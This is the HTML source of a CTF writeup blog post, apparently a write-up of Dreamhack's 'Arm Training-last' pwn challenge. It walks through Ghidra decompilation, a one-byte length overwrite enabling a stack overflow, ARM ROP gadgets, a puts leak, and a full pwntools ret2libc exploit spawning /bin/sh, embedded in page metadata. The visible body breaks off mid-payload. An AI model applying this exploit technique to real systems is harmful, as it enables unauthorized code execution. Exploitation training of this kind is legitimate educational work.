@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Dreamhack Arm Training-last Writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="Dreamhack, pwn">
+<meta name="description" content="Challenge overview
+ARM 단련하기
+
+셸을 획득하여 /flag를 읽어주세요!
+문제 수정 사항
+
+2023-10-20: libc.so.6 파일이 제공됩니다.
+
+Same as the previous arm challenge, we have to use old, reliable, cheap Ghidra.
+This time though, we&rsquo;re dealing with a 32-bit arm training.
+
+Identifying the vulnerabilities
+undefined4 main(EVP_PKEY_CTX *param_1)
+
+{
+  ssize_t sVar1;
+  int check;
+  undefined1 auStack_38 [20];
+  byte abStack_24 [19];
+  char response [4];
+  byte local_d;
+  int counter;
+  
+  counter = 0;
+  local_d = 0x14;
+  init(param_1);
+  while( true ) {
+    printf(&#34;Let\&#39;s Train your arm!\nAre you ready?(y/n) &#34;);
+    sVar1 = read(0,response &#43; 1,2);
+    response[sVar1] = &#39;\0&#39;;
+    check = strcmp(response &#43; 1,&#34;y&#34;);
+    if (check != 0) break;
+    puts(&#34;Gooooo~\nPress enter when you want to stop&#34;);
+    do {
+                    /* thats ~ */
+      abStack_24[counter] = 0x7e;
+      putchar((uint)abStack_24[counter]);
+      counter = counter &#43; 1;
+      sleep(1);
+      check = input_check();
+    } while (check == 0);
+    puts(&#34;OK&#34;);
+  }
+  puts(&#34;Noooooooo...&#34;);
+  puts(&#34;Give me all your ARM Power!!&#34;);
+  read(0,auStack_38,(uint)local_d);
+  return 0;
+}
+undefined4 input_check(void)
+
+{
+  int chestie;
+  undefined4 ret;
+  
+  chestie = poll((pollfd *)&amp;fds,1,0);
+  if (chestie &lt; 1) {
+    ret = 0;
+  }
+  else {
+    do {
+      chestie = getchar();
+    } while (chestie != 10);
+    ret = 1;
+  }
+  return ret;
+}
+The most bizarre thing here is the poll. A word about it:">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/armtraininglast-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.0104eb9d8f72dfc23e72924f1f282ad928b9467519160af39d6ea2ca5ea692a4.css" integrity="sha256-AQTrnY9y38I&#43;cpJPHygq2Si5RnUZFgrznW6iyl6mkqQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/armtraininglast-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/armtraininglast-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="Dreamhack Arm Training-last Writeup">
+  <meta property="og:description" content="Challenge overview ARM 단련하기
+셸을 획득하여 /flag를 읽어주세요! 문제 수정 사항
+2023-10-20: libc.so.6 파일이 제공됩니다.
+Same as the previous arm challenge, we have to use old, reliable, cheap Ghidra.
+This time though, we’re dealing with a 32-bit arm training.
+Identifying the vulnerabilities undefined4 main(EVP_PKEY_CTX *param_1) { ssize_t sVar1; int check; undefined1 auStack_38 [20]; byte abStack_24 [19]; char response [4]; byte local_d; int counter; counter = 0; local_d = 0x14; init(param_1); while( true ) { printf(&#34;Let\&#39;s Train your arm!\nAre you ready?(y/n) &#34;); sVar1 = read(0,response &#43; 1,2); response[sVar1] = &#39;\0&#39;; check = strcmp(response &#43; 1,&#34;y&#34;); if (check != 0) break; puts(&#34;Gooooo~\nPress enter when you want to stop&#34;); do { /* thats ~ */ abStack_24[counter] = 0x7e; putchar((uint)abStack_24[counter]); counter = counter &#43; 1; sleep(1); check = input_check(); } while (check == 0); puts(&#34;OK&#34;); } puts(&#34;Noooooooo...&#34;); puts(&#34;Give me all your ARM Power!!&#34;); read(0,auStack_38,(uint)local_d); return 0; } undefined4 input_check(void) { int chestie; undefined4 ret; chestie = poll((pollfd *)&amp;fds,1,0); if (chestie &lt; 1) { ret = 0; } else { do { chestie = getchar(); } while (chestie != 10); ret = 1; } return ret; } The most bizarre thing here is the poll. A word about it:">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-10T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-10T00:00:00+00:00">
+    <meta property="article:tag" content="Dreamhack">
+    <meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Dreamhack Arm Training-last Writeup">
+<meta name="twitter:description" content="Challenge overview
+ARM 단련하기
+
+셸을 획득하여 /flag를 읽어주세요!
+문제 수정 사항
+
+2023-10-20: libc.so.6 파일이 제공됩니다.
+
+Same as the previous arm challenge, we have to use old, reliable, cheap Ghidra.
+This time though, we&rsquo;re dealing with a 32-bit arm training.
+
+Identifying the vulnerabilities
+undefined4 main(EVP_PKEY_CTX *param_1)
+
+{
+  ssize_t sVar1;
+  int check;
+  undefined1 auStack_38 [20];
+  byte abStack_24 [19];
+  char response [4];
+  byte local_d;
+  int counter;
+  
+  counter = 0;
+  local_d = 0x14;
+  init(param_1);
+  while( true ) {
+    printf(&#34;Let\&#39;s Train your arm!\nAre you ready?(y/n) &#34;);
+    sVar1 = read(0,response &#43; 1,2);
+    response[sVar1] = &#39;\0&#39;;
+    check = strcmp(response &#43; 1,&#34;y&#34;);
+    if (check != 0) break;
+    puts(&#34;Gooooo~\nPress enter when you want to stop&#34;);
+    do {
+                    /* thats ~ */
+      abStack_24[counter] = 0x7e;
+      putchar((uint)abStack_24[counter]);
+      counter = counter &#43; 1;
+      sleep(1);
+      check = input_check();
+    } while (check == 0);
+    puts(&#34;OK&#34;);
+  }
+  puts(&#34;Noooooooo...&#34;);
+  puts(&#34;Give me all your ARM Power!!&#34;);
+  read(0,auStack_38,(uint)local_d);
+  return 0;
+}
+undefined4 input_check(void)
+
+{
+  int chestie;
+  undefined4 ret;
+  
+  chestie = poll((pollfd *)&amp;fds,1,0);
+  if (chestie &lt; 1) {
+    ret = 0;
+  }
+  else {
+    do {
+      chestie = getchar();
+    } while (chestie != 10);
+    ret = 1;
+  }
+  return ret;
+}
+The most bizarre thing here is the poll. A word about it:">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Dreamhack Arm Training-last Writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/armtraininglast-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Dreamhack Arm Training-last Writeup",
+  "name": "Dreamhack Arm Training-last Writeup",
+  "description": "Challenge overview ARM 단련하기\n셸을 획득하여 /flag를 읽어주세요! 문제 수정 사항\n2023-10-20: libc.so.6 파일이 제공됩니다.\nSame as the previous arm challenge, we have to use old, reliable, cheap Ghidra.\nThis time though, we\u0026rsquo;re dealing with a 32-bit arm training.\nIdentifying the vulnerabilities undefined4 main(EVP_PKEY_CTX *param_1) { ssize_t sVar1; int check; undefined1 auStack_38 [20]; byte abStack_24 [19]; char response [4]; byte local_d; int counter; counter = 0; local_d = 0x14; init(param_1); while( true ) { printf(\u0026#34;Let\\\u0026#39;s Train your arm!\\nAre you ready?(y/n) \u0026#34;); sVar1 = read(0,response + 1,2); response[sVar1] = \u0026#39;\\0\u0026#39;; check = strcmp(response + 1,\u0026#34;y\u0026#34;); if (check != 0) break; puts(\u0026#34;Gooooo~\\nPress enter when you want to stop\u0026#34;); do { /* thats ~ */ abStack_24[counter] = 0x7e; putchar((uint)abStack_24[counter]); counter = counter + 1; sleep(1); check = input_check(); } while (check == 0); puts(\u0026#34;OK\u0026#34;); } puts(\u0026#34;Noooooooo...\u0026#34;); puts(\u0026#34;Give me all your ARM Power!!\u0026#34;); read(0,auStack_38,(uint)local_d); return 0; } undefined4 input_check(void) { int chestie; undefined4 ret; chestie = poll((pollfd *)\u0026amp;fds,1,0); if (chestie \u0026lt; 1) { ret = 0; } else { do { chestie = getchar(); } while (chestie != 10); ret = 1; } return ret; } The most bizarre thing here is the poll. A word about it:\n",
+  "keywords": [
+    "Dreamhack", "pwn"
+  ],
+  "articleBody": "Challenge overview ARM 단련하기\n셸을 획득하여 /flag를 읽어주세요! 문제 수정 사항\n2023-10-20: libc.so.6 파일이 제공됩니다.\nSame as the previous arm challenge, we have to use old, reliable, cheap Ghidra.\nThis time though, we’re dealing with a 32-bit arm training.\nIdentifying the vulnerabilities undefined4 main(EVP_PKEY_CTX *param_1) { ssize_t sVar1; int check; undefined1 auStack_38 [20]; byte abStack_24 [19]; char response [4]; byte local_d; int counter; counter = 0; local_d = 0x14; init(param_1); while( true ) { printf(\"Let\\'s Train your arm!\\nAre you ready?(y/n) \"); sVar1 = read(0,response + 1,2); response[sVar1] = '\\0'; check = strcmp(response + 1,\"y\"); if (check != 0) break; puts(\"Gooooo~\\nPress enter when you want to stop\"); do { /* thats ~ */ abStack_24[counter] = 0x7e; putchar((uint)abStack_24[counter]); counter = counter + 1; sleep(1); check = input_check(); } while (check == 0); puts(\"OK\"); } puts(\"Noooooooo...\"); puts(\"Give me all your ARM Power!!\"); read(0,auStack_38,(uint)local_d); return 0; } undefined4 input_check(void) { int chestie; undefined4 ret; chestie = poll((pollfd *)\u0026fds,1,0); if (chestie \u003c 1) { ret = 0; } else { do { chestie = getchar(); } while (chestie != 10); ret = 1; } return ret; } The most bizarre thing here is the poll. A word about it:\nint poll (struct pollfd *fds, nfds_t nfds, int timeout);\nThe poll() function polls one or more open files. The main feature of this function is that it supports polling multiple files and can be used as a query or wait function in read and write operations on pipes, sockets, shared memory objects, and common files.\nThe “fds” input argument specifies the pointer to an array of pointers to structures of pollfd type. Each polled file must have its own structure with a pointer to the array.\nThe “nfds” input argument specifies the number of pointers to the “pollfd” structures that the array contains\nThe input argument timeout specifies the query mode. If this parameter is sent with 0, poll() performs a simple query without waiting.\nWhen the poll() function generates an error, it returns -1 in its output argument. In query mode, the poll() function returns the number of “pollfd” structures with positive results.\nBut the pointer seems undefined…Is that 0 for stdin?\nSo it should return -1 every time, unless we input something.\nOtherwise, input_check just seems to eat characters until you enter. When you do that, it returns 1 and escapes the do while().\nAfter that, we get to write 0x14 into the auStack_38, which is of size 0x14. So not that much to do here…\nWhat should happen is that abStack_24 should overflow but with garbage data. It just hit me as I was writing this; We can have it overflow local_d, change the amount of bytes we can write into auStack_38 and allowing us a proper buffer overflow. We only have a byte though. That’s fine.\nThat’s 19 * ~ for abStack_24, 4 * ~ for response, and the next one is local_d. If it overflows into the following values a little, it’s not that big of a deal.\nThe ELF starts at 0x10000! That’s really strange! I genuinely though I was dealing with offsets, not real addresses, for a while. Let’s try using some gadgets.\n0x00010480: pop {r3, pc} 0x000106e4: mov r0, r3; pop {r11, pc}; I whipped up this payload, and we got a successful leak!!!!!!\npayload = ( b\"A\" * 20 + #auStack38 b\"B\" * 19 + #abStack_24 b\"C\" * 4 + #response b\"\\xff\" + #local_d b\"D\" * 4 + #counter b\"E\" * 4 + #rbp/r11 p32(pop_r3_pc) + p32(puts_got) + p32(mov_r0_r3_pop_r11_pc) + p32(0x0) + p32(puts_plt) ) starting counter now len of payload is 0x48 [*] Switching to interactive mode \\xf0k\\xe8?\\x84\\x04\\x01 [*] Got EOF while reading in interactive $ Now, we just need to do this again, except calling system. I tried to go back to main (failed though).\nBut, as I ran this twice, failing to reach main, I got the same libc offset… Is this also statically linked? That would make everything a lot easier…\nI assumed it was, crafted a new payload, and…\nleaked_puts = 0x3fe86bf0 libc.address = leaked_puts - libc.sym[b\"puts\"] system = libc.sym[b\"system\"] binsh = next(libc.search(b\"/bin/sh\")) Well, it was! I ran the exploit remotely, and got the flag!\nThe exploit from pwn import * import time elf = ELF('/home/kali/Downloads/dreamhack/armtraining/arm_training-last') libc = ELF('/home/kali/Downloads/dreamhack/armtraining/libc.so.6') context.arch = 'arm' cyberedu = 'host8.dreamhack.games:14341' ip, port = cyberedu.split(':') port = int(port) if args.REMOTE: p = remote(ip, port) else: p = elf.process() puts_got = elf.got[b\"puts\"] puts_plt = elf.plt[b\"puts\"] leaked_puts = 0x3fe86bf0 libc.address = leaked_puts - libc.sym[b\"puts\"] system = libc.sym[b\"system\"] binsh = next(libc.search(b\"/bin/sh\")) p.recvuntil(b\") \") p.sendline(b\"y\") p.recvuntil(b\"stop\") print(\"starting counter now\") sleep(26) p.sendline() p.recvuntil(b\") \") p.sendline(b\"n\") p.recvuntil(b\"!\\n\") pop_r3_pc = 0x00010480 mov_r0_r3_pop_r11_pc = 0x000106e4 main = 0x106f4 payload = ( b\"A\" * 20 + #auStack38 b\"B\" * 19 + #abStack_24 b\"C\" * 4 + #response b\"\\xff\" + #local_d b\"D\" * 4 + #counter b\"E\" * 4 + #rbp/r11 p32(pop_r3_pc) + p32(binsh) + p32(mov_r0_r3_pop_r11_pc) + p32(0x0) + p32(system) ) print(f\"len of payload is {hex(len(payload))}\") p.sendline(payload) #data = p.recv(4) #val = u32(data.ljust(4, b\"\\x00\")) #print(f\"leaked is {hex(val)}\") p.interactive() As always, the full code can be found on my GitHub here.\n",
+  "wordCount" : "841",
+  "inLanguage": "en",
+  "datePublished": "2026-05-10T00:00:00Z",
+  "dateModified": "2026-05-10T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/armtraininglast-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">
+                <img src="/writeup-blog/images/sakura.png" alt="" aria-label="logo"
+                     style="vertical-align:middle; margin-right:8px; display:inline-block;">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Dreamhack Arm Training-last Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-05-10 00:00:00 +0000 UTC'>May 10, 2026</span>&nbsp;·&nbsp;<span>4 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
+                <li>
+                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a></li>
+                <li>
+                    <a href="#the-exploit" aria-label="The exploit">The exploit</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
+<p>ARM 단련하기</p>
+<hr>
+<p>셸을 획득하여 /flag를 읽어주세요!
+문제 수정 사항</p>
+<hr>
+<p>2023-10-20: libc.so.6 파일이 제공됩니다.</p>
+<hr>
+<p>Same as the previous arm challenge, we have to use old, reliable, cheap Ghidra.</p>
+<p>This time though, we&rsquo;re dealing with a 32-bit <em>arm training</em>.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/armtraininglast-writeup/arm.gif#center"></p>
+<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">main</span>(EVP_PKEY_CTX <span style="color:#f92672">*</span>param_1)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">ssize_t</span> sVar1;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> check;
+</span></span><span style="display:flex;"><span>  undefined1 auStack_38 [<span style="color:#ae81ff">20</span>];
+</span></span><span style="display:flex;"><span>  byte abStack_24 [<span style="color:#ae81ff">19</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> response [<span style="color:#ae81ff">4</span>];
+</span></span><span style="display:flex;"><span>  byte local_d;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> counter;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  local_d <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x14</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">init</span>(param_1);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>( true ) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Let</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s Train your arm!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Are you ready?(y/n) &#34;</span>);
+</span></span><span style="display:flex;"><span>    sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,response <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>    response[sVar1] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>    check <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(response <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;y&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (check <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Gooooo~</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Press enter when you want to stop&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* thats ~ */</span>
+</span></span><span style="display:flex;"><span>      abStack_24[counter] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7e</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">putchar</span>((uint)abStack_24[counter]);
+</span></span><span style="display:flex;"><span>      counter <span style="color:#f92672">=</span> counter <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>      check <span style="color:#f92672">=</span> <span style="color:#a6e22e">input_check</span>();
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">while</span> (check <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;OK&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Noooooooo...&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Give me all your ARM Power!!&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,auStack_38,(uint)local_d);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">input_check</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> chestie;
+</span></span><span style="display:flex;"><span>  undefined4 ret;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  chestie <span style="color:#f92672">=</span> <span style="color:#a6e22e">poll</span>((pollfd <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>fds,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (chestie <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>      chestie <span style="color:#f92672">=</span> <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">while</span> (chestie <span style="color:#f92672">!=</span> <span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> ret;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The most bizarre thing here is the <code>poll</code>. A <a href="https://linuxhint.com/use-poll-system-call-c/">word</a> about it:</p>
+<blockquote>
+<p><code>int poll (struct pollfd *fds, nfds_t nfds, int timeout);</code></p>
+<p>The poll() function polls one or more open files. The main feature of this function is that it supports polling multiple files and can be used as a query or wait function in read and write operations on pipes, sockets, shared memory objects, and common files.</p>
+<p>The “fds” input argument specifies the pointer to an array of pointers to structures of pollfd type. Each polled file must have its own structure with a pointer to the array.</p>
+<p>The “nfds” input argument specifies the number of pointers to the “pollfd” structures that the array contains</p>
+<p>The input argument timeout specifies the query mode. If this parameter is sent with 0, poll() performs a simple query without waiting.</p>
+<p>When the poll() function generates an error, it returns -1 in its output argument. In query mode, the poll() function returns the number of “pollfd” structures with positive results.</p></blockquote>
+<p>But the pointer seems undefined&hellip;Is that 0 for <code>stdin</code>?</p>
+<p>So it should return <code>-1</code> every time, unless we input something.</p>
+<p>Otherwise, <code>input_check</code> just seems to eat characters until you <em>enter</em>. When you do that, it returns <code>1</code> and escapes the <code>do while()</code>.</p>
+<p>After that, we get to write <code>0x14</code> into the <code>auStack_38</code>, which is of size <code>0x14</code>. So not that much to do here&hellip;</p>
+<p>What <em>should</em> happen is that <code>abStack_24</code> should overflow but with garbage data. It just hit me as I was writing this; We can have it overflow <code>local_d</code>, change the amount of bytes we can write into <code>auStack_38</code> and allowing us a proper buffer overflow. We only have a byte though. That&rsquo;s fine.</p>
+<p>That&rsquo;s <code>19 * ~</code> for <code>abStack_24</code>, <code>4 * ~</code> for <code>response</code>, and the next one is <code>local_d</code>. If it overflows into the following values a little, it&rsquo;s not that big of a deal.</p>
+<p>The ELF starts at <code>0x10000</code>! That&rsquo;s really strange! I genuinely though I was dealing with offsets, not real addresses, for a while. Let&rsquo;s try using some gadgets.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x00010480: pop <span style="color:#f92672">{</span>r3, pc<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>0x000106e4: mov r0, r3; pop <span style="color:#f92672">{</span>r11, pc<span style="color:#f92672">}</span>;
+</span></span></code></pre></div><p>I whipped up this payload, and we got a successful leak!!!!!!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> ( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">20</span> <span style="color:#f92672">+</span> <span style="color:#75715e">#auStack38</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">19</span> <span style="color:#f92672">+</span> <span style="color:#75715e">#abStack_24</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#75715e">#response</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#75715e">#local_d</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>  <span style="color:#f92672">+</span> <span style="color:#75715e">#counter</span>
